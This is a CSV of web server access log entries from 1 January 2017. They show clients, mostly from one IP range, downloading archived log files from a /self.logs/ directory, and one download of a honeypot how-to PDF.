Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,46.229.168.66,-,01/Jan/2017:11:07:24 -0800,GET /self.logs/access.log.2016-08-30.gz HTTP/1.1,200,9205
WSC,46.229.168.72,-,01/Jan/2017:11:07:44 -0800,GET /self.logs/access.log.2016-11-13.gz HTTP/1.1,200,12404
WSC,46.229.168.71,-,01/Jan/2017:11:07:58 -0800,GET /self.logs/access.log.2016-07-30.gz HTTP/1.1,200,5568
WSC,46.229.168.72,-,01/Jan/2017:11:08:16 -0800,GET /self.logs/error.log.2016-11-13.gz HTTP/1.1,200,880
WSC,46.229.168.67,-,01/Jan/2017:11:08:37 -0800,GET /self.logs/error.log.2016-07-29.gz HTTP/1.1,200,970
WSC,46.229.168.65,-,01/Jan/2017:11:08:52 -0800,GET /self.logs/access.log.2016-07-17.gz HTTP/1.1,200,6411
WSC,46.229.168.67,-,01/Jan/2017:11:09:10 -0800,GET /self.logs/error.log.2016-06-23.gz HTTP/1.1,200,789
WSC,46.229.168.73,-,01/Jan/2017:11:09:31 -0800,GET /self.logs/error.log.2016-06-24.gz HTTP/1.1,200,1325
WSC,46.229.168.69,-,01/Jan/2017:11:09:49 -0800,GET /self.logs/access.log.2016-08-22.gz HTTP/1.1,200,8830
WSC,46.229.168.74,-,01/Jan/2017:11:10:05 -0800,GET /self.logs/access.log.2016-08-02.gz HTTP/1.1,200,9918
WSC,46.229.168.68,-,01/Jan/2017:11:10:26 -0800,GET /self.logs/error.log.2016-09-04.gz HTTP/1.1,200,1029
WSC,46.229.168.73,-,01/Jan/2017:11:10:41 -0800,GET /self.logs/error.log.2016-10-12.gz HTTP/1.1,200,1276
WSC,36.110.120.151,-,01/Jan/2017:11:10:54 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,46.229.168.69,-,01/Jan/2017:11:11:00 -0800,GET /self.logs/error.log.2016-08-31.gz HTTP/1.1,200,796
WSC,46.229.168.70,-,01/Jan/2017:11:11:15 -0800,GET /self.logs/access.log.2016-09-10.gz HTTP/1.1,200,5328
WSC,46.229.168.67,-,01/Jan/2017:11:11:39 -0800,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1,200,981
WSC,46.229.168.74,-,01/Jan/2017:11:11:53 -0800,GET /self.logs/error.log.2016-09-29.gz HTTP/1.1,200,550
WSC,46.229.168.65,-,01/Jan/2017:11:12:10 -0800,GET /self.logs/error.log.2016-10-20.gz HTTP/1.1,200,660
WSC,46.229.168.72,-,01/Jan/2017:11:12:28 -0800,GET /self.logs/access.log.2016-06-23.gz HTTP/1.1,200,7032
WSC,46.229.168.73,-,01/Jan/2017:11:12:49 -0800,GET /self.logs/access.log.2016-10-15.gz HTTP/1.1,200,6915
WSC,46.229.168.65,-,01/Jan/2017:11:13:06 -0800,GET /self.logs/error.log.2016-09-02.gz HTTP/1.1,200,735
WSC,46.229.168.68,-,01/Jan/2017:11:13:24 -0800,GET /self.logs/access.log.2016-04-19.gz HTTP/1.1,200,23663
WSC,46.229.168.65,-,01/Jan/2017:11:13:42 -0800,GET /self.logs/error.log.2016-05-28.gz HTTP/1.1,200,589
WSC,46.229.168.71,-,01/Jan/2017:11:14:02 -0800,GET /self.logs/access.log.2015-03-12.gz HTTP/1.1,200,9523
WSC,46.229.168.67,-,01/Jan/2017:11:14:16 -0800,GET /self.logs/error.log.2015-01-21.gz HTTP/1.1,200,579
